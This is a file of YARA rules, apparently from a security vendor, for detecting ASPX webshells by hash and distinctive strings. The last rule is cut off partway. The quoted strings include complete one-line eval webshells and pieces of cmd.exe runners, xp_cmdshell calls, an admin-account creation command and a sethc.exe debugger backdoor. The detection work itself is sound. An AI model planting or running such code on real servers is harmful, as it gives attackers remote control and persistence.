rule sig_620ee444517df8e28f95e4046cd7509ac86cd514
{
    meta:
        description = "aspx - file 620ee444517df8e28f95e4046cd7509ac86cd514.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "181200e3ab5696292cf148b6dff4b0fbe11359ed0ec2c7cb613d4b3dcefcb351"
    strings:
        $s1 = "&nbsp; &nbsp;<asp:Button runat=\"server\" ID=\"cmdExec\" Text=\"Execute\" BackColor=\"Black\" Font-Bold=\"True\" ForeColor" fullword ascii
        $s2 = "<%-- TurkisH-RuleZ SheLL v0.2 - CMD Version --%>" fullword ascii
        $s3 = "<h2><font color=\"#FF0000\"># Command  Line Shell Priv8&nbsp;</font></h2>" fullword ascii
        $s4 = "lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();" fullword ascii
        $s5 = "p.StartInfo.FileName = \"cmd.exe\";" fullword ascii
        $s6 = "// Executing Command'z " fullword ascii
        $s7 = "<%--  www.sec4ever.com  | www.sec-t.net --%>" fullword ascii
        $s8 = "p.StartInfo.UseShellExecute = false;" fullword ascii
        $s9 = "&nbsp; &nbsp;<asp:Button runat=\"server\" ID=\"cmdExec\" Text=\"Execute\" BackColor=\"Black\" Font-Bold=\"True\" ForeColor=\"Whi" ascii
        $s10 = "<%@ Import Namespace=\"System.Web.UI.WebControls\" %>" fullword ascii
        $s11 = "<pre><asp:Literal runat=\"server\" ID=\"lblCmdOut\" Mode=\"Encode\" /></pre>" fullword ascii
        $s12 = "p.StartInfo.Arguments = \"/c \" + txtCmdIn.Text;" fullword ascii
        $s13 = "<table border=\"0\" width=\"100%\" id=\"table1\" cellspacing=\"0\" cellpadding=\"0\" bgcolor=\"#CC8CED\">" fullword ascii
        $s14 = "* { font-family: Arial; font-size: 12px; }" fullword ascii
        $s15 = "<title># TurkisH-RuleZ SheLL</title>" fullword ascii
        $s16 = "protected void cmdUpload_Click(object sender, EventArgs e)" fullword ascii
        $s17 = "protected void txtCmdIn_TextChanged(object sender, EventArgs e)" fullword ascii
        $s18 = "h2 { font-size: 14px; background-color: #000000; color: #ffffff; padding: 2px; }" fullword ascii
        $s19 = "h1 { font-size: 16px; background-color: #000000; color: #ffffff; padding: 5px; }" fullword ascii
        $s20 = "pre { font-family: Courier New; background-color: #c7c7c7;  }" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( 8 of them ) ) or ( all of them )
}

rule sig_61c1efc3855b922bd98e80325822223d49b4b9ef
{
    meta:
        description = "aspx - file 61c1efc3855b922bd98e80325822223d49b4b9ef.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "77a2ef905973160b87a25ae50503e9a0776e0682d3e1f26a6325a328a859fe4e"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"1\"],\"unsafe " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_438b7a8e934702b146d2f3ed6185367081dca1ce
{
    meta:
        description = "aspx - file 438b7a8e934702b146d2f3ed6185367081dca1ce.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0af43e6bd8e7d074ebd4e3f987b65072bfdd5bd439b8791ccf4ae7bc2360da57"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"ice\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x4947 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_60c958fdda40e90098eccaa3043cd491781a546b
{
    meta:
        description = "aspx - file 60c958fdda40e90098eccaa3043cd491781a546b.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e22d35913ca3043871b8dd3f6a1ca2239fa4000613d036fd19866f3a5de579b6"
    strings:
        $x1 = "System.Data.SqlClient.SqlCommand cmd = new System.Data.SqlClient.SqlCommand(sqlStr, connection);" fullword ascii
        $s2 = "file.Write(@\"<html><head><meta http-equiv=content-type content='text/html; charset=UNICODE'>" fullword ascii
        $s3 = "System.Data.SqlClient.SqlDataAdapter da = new System.Data.SqlClient.SqlDataAdapter(cmd);" fullword ascii
        $s4 = "System.Data.SqlClient.SqlConnection connection = new System.Data.SqlClient.SqlConnection(connectionString);" fullword ascii
        $s5 = "System.IO.StreamWriter file = new System.IO.StreamWriter(filePath+\"\\\\\" + (z+1) +\"_\"+fileName, false, Encoding.UTF8);" fullword ascii
        $s6 = "string filePath = System.IO.Path.GetDirectoryName(Server.MapPath(\"DataOutExl.aspx\"))+\"\\\\DataOut\";" fullword ascii
        $s7 = "string connectionString = \"server=\"+serverIP+\";database=\"+database+\";uid=\"+user+\";pwd=\"+pass;" fullword ascii
        $s8 = "By:<a href=\"http://hi.baidu.com/" fullword ascii
        $s9 = "System.Data.DataSet ds = new System.Data.DataSet();" fullword ascii
        $s10 = "System.Data.DataRow dataRow = dataTable.Rows[i];" fullword ascii
        $s11 = "if (serverIP != null & database != null & user != null & pass != null & tableName != null & fileName != null)" fullword ascii
        $s12 = "<asp:RadioButton ID=\"RadioButton1\" runat=\"server\" GroupName=\"type\" Checked=\"true\" Text=\"html\" />" fullword ascii
        $s13 = "System.Data.DataTable dataTable = ds.Tables[0];" fullword ascii
        $s14 = "<asp:TextBox ID=\"txtPass\" runat=\"server\" Width=\"172px\"></asp:TextBox>" fullword ascii
        $s15 = "<asp:TextBox ID=\"txtUser\" runat=\"server\" Width=\"172px\"></asp:TextBox>" fullword ascii
        $s16 = "lblInfo.ForeColor = System.Drawing.Color.Red;" fullword ascii
        $s17 = "<asp:RadioButton ID=\"RadioButton2\" runat=\"server\" GroupName=\"type\" Text=\"txt\" />" fullword ascii
        $s18 = "<asp:TextBox ID=\"txtTableName\" runat=\"server\" Width=\"172px\"></asp:TextBox>" fullword ascii
        $s19 = "<title>Export Table</title></head><body>\");" fullword ascii
        $s20 = "lblInfo.ForeColor = System.Drawing.Color.Blue;  " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_2d65963e7a3251cab376a16d7507aa2d3f12f97c
{
    meta:
        description = "aspx - file 2d65963e7a3251cab376a16d7507aa2d3f12f97c.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3a6091fd5b5755d0249ef4d6af11c807dbe902c2428f923ad2490e99ebbf06ad"
    strings:
        $s1 = "temp = \"<form enctype=\\\"multipart/form-data\\\" action=\\\"?operation=upload\\\" method=\\\"post\\\">\";" fullword ascii
        $s2 = "using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.F" fullword ascii
        $s3 = "temp += \"<br>Auth Key: <input type=\\\"text\\\" name=\\\"authKey\\\"><br>\";" fullword ascii
        $s4 = "httpPostedFile.InputStream.Read(buffer, 0, fileLength);" fullword ascii
        $s5 = "int fileLength = httpPostedFile.ContentLength;" fullword ascii
        $s6 = "temp += \"<br>Please specify a file: <input type=\\\"file\\\" name=\\\"file\\\"></br>\";" fullword ascii
        $s7 = "<!-- Created by Mark Woan (http://www.woanware.co.uk) -->" fullword ascii
        $s8 = "using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.FileName)), F" ascii
        $s9 = "Response.Write(this.GetUploadControls());" fullword ascii
        $s10 = "temp += \"<div><input type=\\\"submit\\\" value=\\\"Send\\\"></div>\";" fullword ascii
        $s11 = "HttpPostedFile httpPostedFile = Request.Files[0];" fullword ascii
        $s12 = "private const string AUTHKEY = \"woanware\";" fullword ascii
        $s13 = "private string GetUploadControls()" fullword ascii
        $s14 = "if (Request.Params[\"operation\"] == \"upload\")" fullword ascii
        $s15 = "private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,ta" ascii
        $s16 = "Response.Write(\"Unknown operation\");" fullword ascii
        $s17 = "if (Request.Params[\"authkey\"] == null)" fullword ascii
        $s18 = "private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,ta" ascii
        $s19 = "if (Request.Params[\"authkey\"] != AUTHKEY)" fullword ascii
        $s20 = "string temp = string.Empty;" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule a34ca74451e192d9ec53ba2e4ac04a01ee73aba6
{
    meta:
        description = "aspx - file a34ca74451e192d9ec53ba2e4ac04a01ee73aba6.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d175b3176f1fb891735a2aaed2bc851074b3b50d4eb99c90146dc6a0eaa26d48"
    strings:
        $x1 = "ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo(\"cmd.exe\");" fullword ascii
        $x2 = ":<asp:TextBox ID=\"TextBoxDurl\" runat=\"server\" Width=\"270px\">http://www.baidu.com/img/logo.gif</asp:TextBox></br>" fullword ascii
        $x3 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + HttpUtility.UrlEncode(file.Name));" fullword ascii
        $x4 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\'><font color=\"#009900\">All Users</font></a> </td>" fullword ascii
        $s5 = "MyProcessStartInfo.UseShellExecute = false;" fullword ascii
        $s6 = "tfit.Text = \"<a href=\\\"javascript:Bin_PostBack('Bin_Listdir','\" + MVVJ(HlyU.Properties[\"Path\"].V" fullword ascii
        $s7 = "<asp:TextBox ID=\"TextBoxNewfile\" runat=\"server\" Width=\"477px\" ForeColor=\"#009900\" >c:\\char.txt</asp:TextBox>" fullword ascii
        $s8 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\config\\'><font color=\"#009900\">Config</font></a> </td>" fullword ascii
        $s9 = ":<asp:TextBox ID=\"TextBoxDfile\" runat=\"server\" Width=\"270px\">c:\\logo.gif</asp:TextBox>" fullword ascii
        $s10 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\inetsrv\\data\\'><font color=\"#009900\">Data</font></a> </td>" fullword ascii
        $s11 = "<asp:Label ID=\"LbSqlD\" runat=\"server\" Text=\"Command:\" Width=\"42px\"></asp:Label>" fullword ascii
        $s12 = "<td><a href='?page=index&src=C:\\Program Files\\RhinoSoft.com\\'><font color=\"#009900\">Serv-u" fullword ascii
        $s13 = "MyProcessStartInfo.Arguments = \"/c\" + TextBoxDos.Text;" fullword ascii
        $s14 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\" fullword ascii
        $s15 = "Response.Write(\"<a href='?page=index&src=\" + Server.MapPath(\".\") + \"\\\\'><font color='#009900'>Webshell" fullword ascii
        $s16 = "TR.Attributes[\"title\"] = \"Site:\" + child.Properties[\"ServerComment\"].Value.ToString();" fullword ascii
        $s17 = "<td><asp:TextBox ID=\"pass\" runat=\"server\" TextMode=\"Password\" ForeColor = \"#009900\"></asp:TextBox></td>" fullword ascii
        $s18 = "<td><a href='?page=index&src=C:\\windows\\Temp\\'><font color=\"#009900\">Temp</font></a> </td>" fullword ascii
        $s19 = "<asp:Label ID=\"LbSqlA\" runat=\"server\" Text=\"Sql Host:\"></asp:Label>" fullword ascii
        $s20 = "<%@ Page Language=\"C#\" ContentType=\"text/html\" validateRequest=\"false\" aspcompat=\"true\"%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b23dc6448547f66f99dc90c546f64b0604748d52
{
    meta:
        description = "aspx - file b23dc6448547f66f99dc90c546f64b0604748d52.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4c594ba00a4e4ce8f258a942c590199af522e0d140a1b8525d70300d22a7f358"
    strings:
        $s1 = "temp = \"<form enctype=\\\"multipart/form-data\\\" action=\\\"?operation=upload\\\" method=\\\"post\\\">\";" fullword ascii
        $s2 = "using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.F" fullword ascii
        $s3 = "httpPostedFile.InputStream.Read(buffer, 0, fileLength);" fullword ascii
        $s4 = "int fileLength = httpPostedFile.ContentLength;" fullword ascii
        $s5 = "temp += \"<p>Please specify a file: <input type=\\\"file\\\" name=\\\"file\\\"></p>\";" fullword ascii
        $s6 = "<!-- Created by Mark Woan (http://www.woany.co.uk) -->" fullword ascii
        $s7 = "using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.FileName)), F" ascii
        $s8 = "Response.Write(this.GetUploadControls());" fullword ascii
        $s9 = "temp += \"<div><input type=\\\"submit\\\" value=\\\"Send\\\"></div>\";" fullword ascii
        $s10 = "HttpPostedFile httpPostedFile = Request.Files[0];" fullword ascii
        $s11 = "private string GetUploadControls()" fullword ascii
        $s12 = "if (Request.Params[\"operation\"] == \"upload\")" fullword ascii
        $s13 = "private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,ta" ascii
        $s14 = "Response.Write(\"Unknown operation\");" fullword ascii
        $s15 = "private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,ta" ascii
        $s16 = "string temp = string.Empty;" fullword ascii
        $s17 = "if (Request.Params[\"operation\"] != null)" fullword ascii
        $s18 = "Response.Write(this.UploadFile());" fullword ascii
        $s19 = "temp += \"</form>\";" fullword ascii
        $s20 = "private const string FOOTER = \"</body>\\n</html>\\n\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( 8 of them ) ) or ( all of them )
}

rule d5c3b9f52c6717a94e5daa5278bf1a801fccee82
{
    meta:
        description = "aspx - file d5c3b9f52c6717a94e5daa5278bf1a801fccee82.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2152f5aae39aebabd342ec252b2ec0fec2913b605b21c3983c016a3b83949b7f"
    strings:
        $x1 = "HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(YfCnP + this.Request.Url.ToString() + pbzw + Password" fullword ascii
        $s2 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" val" ascii
        $s3 = ".Bin_Style_Login{font-size: 12px; font-family:Tahoma;background-color:#ddd;border:1px solid #fff;}" fullword ascii
        $s4 = "GLpi.Text=\"<a href=\\\"#\\\" onclick=\\\"Bin_PostBack('ksGR','\"+MVVJ(AXSbb.Value+Bin_Files.Name)+\"')\\\">" fullword ascii
        $s5 = ": <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownList runat=\"serv" ascii
        $s6 = "HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(YfCnP + this.Request.Url.ToString() + pbzw + Password + \"\"); Ht" ascii
        $s7 = "+ \"\"); HttpWebResponse response = (HttpWebResponse)request.GetResponse();" fullword ascii
        $s8 = "portble = Encoding.Default.GetString(Convert.FromBase64String(portble));" fullword ascii
        $s9 = "bin_data = Encoding.Default.GetString(Convert.FromBase64String(bin_data));" fullword ascii
        $s10 = ".head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#073b07;padding:5px 10px 5px 5px;font-weight:bold;}" fullword ascii
        $s11 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('Bin_Editfile','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s12 = "\" OnClick=\"Ybg\"></asp:LinkButton> | <asp:LinkButton ID=\"xxzE\" runat=\"server\" Text=\"Cmd" fullword ascii
        $s13 = "IP : <asp:TextBox id=\"MdR\" style=\"width:10%;margin:0 8px;\" CssClass=\"input\" runat=\"server\" Text=\"127.0.0.1\"/> " fullword ascii
        $s14 = "\" OnClick=\"mcCY\"></asp:LinkButton> | <a href=\"#\" id=\"Bin_Button_CreateDir\" runat=\"server\">" fullword ascii
        $s15 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('cYAl','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s16 = "if (Jfm == Password || HRJ.Text==this.Request.Url.ToString())" fullword ascii
        $s17 = "<td ><span style=\"float:right;\"><a href=\"#\" target=\"_blank\">" fullword ascii
        $s18 = "public string Password=\"202cb962ac59075b964b07152d234b70\";//" fullword ascii
        $s19 = ") ?')){Bin_PostBack('kRXgt','\"+MVVJ(AXSbb.Value+Bin_folder.Name)+\"')};\\\">" fullword ascii
        $s20 = "Ip : <input class=\"input\" runat=\"server\" id=\"eEpm\" type=\"text\" size=\"20\" value=\"127.0.0.1\"/></td>" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_6260e2b5f354293200512ea9447481d0ca2f9c5c
{
    meta:
        description = "aspx - file 6260e2b5f354293200512ea9447481d0ca2f9c5c.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "533afe60edc337eb95484a9f84aeba1c90884711acc842f5dc4ab7374ed45263"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%Response.Write(eval(Request.Item[\"z\"],\"unsafe\"));%>" fullword ascii
        $s2 = "<form action=/aspx/6173e106b929b82f8f23ee0714bf77e6.aspx method=post>" fullword ascii
        $s3 = "var nonamed=new System.IO.StreamWriter(Server.MapPath(\"nonamed.aspx\"),false);" fullword ascii
        $s4 = "<textarea name=l cols=120 rows=10 width=45>your code</textarea><BR><center><br>" fullword ascii
        $s5 = "<TITLE> ASPX one line Code Client by amxku</TITLE>" fullword ascii
        $s6 = "nonamed.Write(Request.Item[\"l\"]);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_27547804e3e0cf4e96ab589bdc162bd90bb61d83
{
    meta:
        description = "aspx - file 27547804e3e0cf4e96ab589bdc162bd90bb61d83.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b1c841b9bd1fb51131a8dd49681d05550d4d5dde5e064c392a18ac27651738ac"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\" validateRequest=\"false\" %><%Response.Write(eval(Request.Item[\"w\"],\"unsafe\"));%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule d82037ed27ef5187c62b2585c1ca1566dedea96a
{
    meta:
        description = "aspx - file d82037ed27ef5187c62b2585c1ca1566dedea96a.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "19e68c22b82d5b22330e8d860c0481e5c6a7d8ab1754773a86c90efab1a1e059"
    strings:
        $x1 = "Response.Write(Server.HtmlEncode(this.ExecuteCommand(txtCommand.Text)));" fullword ascii
        $x2 = "processStartInfo.FileName = \"cmd.exe\";" fullword ascii
        $s3 = "processStartInfo.Arguments = \"/c \" + command;" fullword ascii
        $s4 = "processStartInfo.UseShellExecute = false;" fullword ascii
        $s5 = "private string ExecuteCommand(string command)" fullword ascii
        $s6 = "<td><asp:Button ID=\"btnExecute\" runat=\"server\" OnClick=\"btnExecute_Click\" Text=\"Execute\" /></td>" fullword ascii
        $s7 = "<td><asp:TextBox ID=\"txtCommand\" runat=\"server\" Width=\"820px\"></asp:TextBox></td>" fullword ascii
        $s8 = "protected void btnExecute_Click(object sender, EventArgs e)" fullword ascii
        $s9 = "processStartInfo.RedirectStandardOutput = true;" fullword ascii
        $s10 = "ProcessStartInfo processStartInfo = new ProcessStartInfo();" fullword ascii
        $s11 = "using (StreamReader streamReader = process.StandardOutput)" fullword ascii
        $s12 = "<!-- Created by Mark Woan (http://www.woany.co.uk) -->" fullword ascii
        $s13 = "Process process = Process.Start(processStartInfo);" fullword ascii
        $s14 = "<form id=\"formCommand\" runat=\"server\">" fullword ascii
        $s15 = "/// <param name=\"command\"></param>" fullword ascii
        $s16 = "<%@ Import namespace=\"System.Diagnostics\"%>" fullword ascii
        $s17 = "private const string HEADER = \"<html>\\n<head>\\n<title>command</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,table,p,pre," ascii
        $s18 = "<title>Command</title>" fullword ascii
        $s19 = "private const string FOOTER = \"</body>\\n</html>\\n\";" fullword ascii
        $s20 = "private const string HEADER = \"<html>\\n<head>\\n<title>command</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,table,p,pre," ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 7KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ecedc94ae94181d35bba4adca2d2b36b7953e0b0
{
    meta:
        description = "aspx - file ecedc94ae94181d35bba4adca2d2b36b7953e0b0.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a0966397a4ce01f1af5ae25dd9836e3c24e656bf2121de8c3cfea2dee9670011"
    strings:
        $s1 = "<asp:TextBox ID=\"txtlogfile\" runat=\"server\"   width=\"90%\" Text=\"log.log\" ></asp:TextBox>" fullword ascii
        $s2 = "<asp:CheckBox ID=\"s_http_post\" runat=\"server\" />" fullword ascii
        $s3 = "<asp:TextBox ID=\"txtport\" Text=\"0\"  width=\"90%\" runat=\"server\"></asp:TextBox>" fullword ascii
        $s4 = "<%@ Import Namespace=\"System.Net.NetworkInformation\" %>" fullword ascii
        $s5 = "<td ><asp:DropDownList ID=\"ddlist\" runat=\"server\" width=\"90%\"></asp:DropDownList></td>" fullword ascii
        $s6 = "<asp:Button ID=\"Button_ref\" runat=\"server\" OnClick=\"Refresh_Click\" Text=\"Refresh/View Status\" /><br />" fullword ascii
        $s7 = "er-width: 1px;border-style: solid;border-color: -moz-use-text-color;padding-bottom:10px;}" fullword ascii
        $s8 = "<asp:TextBox ID=\"txtMinisize\" Text=\"0\"  width=\"90%\" runat=\"server\" ></asp:TextBox>" fullword ascii
        $s9 = "<asp:TextBox ID=\"txtpackets\" runat=\"server\"  width=\"90%\" Text=\"300\"></asp:TextBox>" fullword ascii
        $s10 = "FTP Password:" fullword ascii
        $s11 = "<asp:CheckBox ID=\"s_ftp\" runat=\"server\" Checked />" fullword ascii
        $s12 = "<asp:Button ID=\"Button1\" runat=\"server\" OnClick=\"Stop_Click\" Text=\"Stop\" />" fullword ascii
        $s13 = "<asp:CheckBox ID=\"s_smtp\" runat=\"server\" />" fullword ascii
        $s14 = "<asp:TextBox ID=\"txtkeywords\" runat=\"server\"   width=\"90%\" Text=\"\"></asp:TextBox>" fullword ascii
        $s15 = "<div id=\"tt\">  <b> WebSniff 1.0</b><br /><br /></div>" fullword ascii
        $s16 = "<td   width=\"90%\"><div id=\"s\"><asp:Label ID=\"Lb_msg2\" runat=\"server\" Text=\"\"></div></asp:Label>" fullword ascii
        $s17 = "<td   width=\"90%\"><div id=\"s\"><asp:Label ID=\"Lb_msg\" runat=\"server\" Text=\"\"></div></asp:Label>" fullword ascii
        $s18 = "<td   width=\"90%\" >   <asp:Button ID=\"Starts\" runat=\"server\" OnClick=\"Start_Click\" Text=\"Start\" />" fullword ascii
        $s19 = "<td  width=\"10%\">Auto sniff: </td>" fullword ascii
        $s20 = "HTTP Post Data:" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 60KB and ( 8 of them ) ) or ( all of them )
}

rule sig_41fbd2f965a3c48011f9a2b6c629278c48286ab3
{
    meta:
        description = "aspx - file 41fbd2f965a3c48011f9a2b6c629278c48286ab3.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c6da86380a656233b12552ce321026d4d481fc531cc8b44dee7a6b395cecfd9b"
    strings:
        $x1 = "ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo(\"cmd.exe\");" fullword ascii
        $x2 = ":<asp:TextBox ID=\"TextBoxDurl\" runat=\"server\"  Width=\"270px\">http://www.baidu.com/img/logo.gif</asp:TextBox></br>" fullword ascii
        $x3 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + HttpUtility.UrlEncode(file.Name));" fullword ascii
        $x4 = "cmd.CommandText = \"exec master..xp_cmdshell '\" + TextBoxSqlCon.Text + \"'\";" fullword ascii
        $s5 = "MyProcessStartInfo.UseShellExecute = false;" fullword ascii
        $s6 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\Documents\\'>Documents</a>&nbsp&nbsp</td>" fullword ascii
        $s7 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\'>All Users</a>&nbsp&nbsp</td>" fullword ascii
        $s8 = ":<asp:TextBox ID=\"TextBoxDfile\" runat=\"server\"  Width=\"270px\">c:\\logo.gif</asp:TextBox>" fullword ascii
        $s9 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\'>PcAn" fullword ascii
        $s10 = "<asp:Label ID=\"LbSqlD\" runat=\"server\" Text=\"Command:\" Width=\"42px\"></asp:Label>" fullword ascii
        $s11 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\config\\'>Config</a>&nbsp&nbsp</td>" fullword ascii
        $s12 = "<asp:TextBox ID=\"TextBoxNewfile\" runat=\"server\" Width=\"477px\" >c:\\char.txt</asp:TextBox>" fullword ascii
        $s13 = "mycon.ConnectionString = \"Persist Security Info = False;User id =\" + TextBoxSqlB.Text + \";pwd=\" + TextBoxSql" fullword ascii
        $s14 = "mycon.ConnectionString = \"Persist Security Info = False;User id =\" + TextBoxSqlB.Text + \";pwd=\" + TextBo" fullword ascii
        $s15 = "MyProcessStartInfo.Arguments = \"/c\" + TextBoxDos.Text;" fullword ascii
        $s16 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\" fullword ascii
        $s17 = "Response.Write(\"<a href='?page=index&src=\" + Server.MapPath(\".\") + \"\\\\'><font color='#009900'>Webshell" fullword ascii
        $s18 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\inetsrv\\data\\'>Data</a>&nbsp&nbsp</td>" fullword ascii
        $s19 = "<asp:TextBox ID=\"TextBoxSqlCon\" runat=\"server\" Width=\"400px\" >net user char char /add &amp; net localgroup administrator" fullword ascii
        $s20 = "<td><a href='?page=index&src=C:\\Program Files\\RhinoSoft.com\\'>Serv-u" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule e0f7fa2b7a11fce6b31f8cc2d02c8c98d1b7a182
{
    meta:
        description = "aspx - file e0f7fa2b7a11fce6b31f8cc2d02c8c98d1b7a182.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "30ca07fe00973e7cd95d1cfa7e3a3bf05eecfc624763b4db2428c68e7f226573"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"cmd3306\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x6967 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_260ecc6add85476012263efbbae4d9e7230b6793
{
    meta:
        description = "aspx - file 260ecc6add85476012263efbbae4d9e7230b6793.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "dd98cb9eb7f3ba8f866a8280fc2028b6e7e22913af362d5ae070fbaf55797153"
    strings:
        $s1 = "<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request[" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule fc2630111dd723733c4ccd25e51db12522a3260a
{
    meta:
        description = "aspx - file fc2630111dd723733c4ccd25e51db12522a3260a.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fabe7d37dfc95345960dbba22ed33d946fd37cf1624df258cd3ac29c86d63c4e"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%Response.Write(eval(Request.Item[\"xiaoma\"],\"unsafe\"));%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_9449e3c50d1f504070d94935dc5783f6439ca472
{
    meta:
        description = "aspx - file 9449e3c50d1f504070d94935dc5783f6439ca472.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "22a4713ee6ea513dd91915e15eda0892a239efaa89bcf81a9e3e947acacf5006"
    strings:
        $x1 = "\\\\ias\\\\ias.mdb','select shell(\\\" cmd.exe /c \" + shellcmd.Text.Trim () + \" \\\")')\";" fullword ascii
        $x2 = "string jksql4 = jksql3 + \"select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\\\windows\\\\system32\\\\ias\\\\ias" ascii
        $x3 = "ion\\\\Image File Execution Options\\\\sethc.exe','debugger','REG_SZ','c:\\\\windows\\\\explorer.exe' \";" fullword ascii
        $x4 = "SqlDataReader  agentdr = agentcmd.ExecuteReader();" fullword ascii
        $x5 = "Response.AddHeader (\"Content-Disposition\",\"attachment;filename=\" + HttpUtility.UrlEncode (fi.Name,System.Text.En" fullword ascii
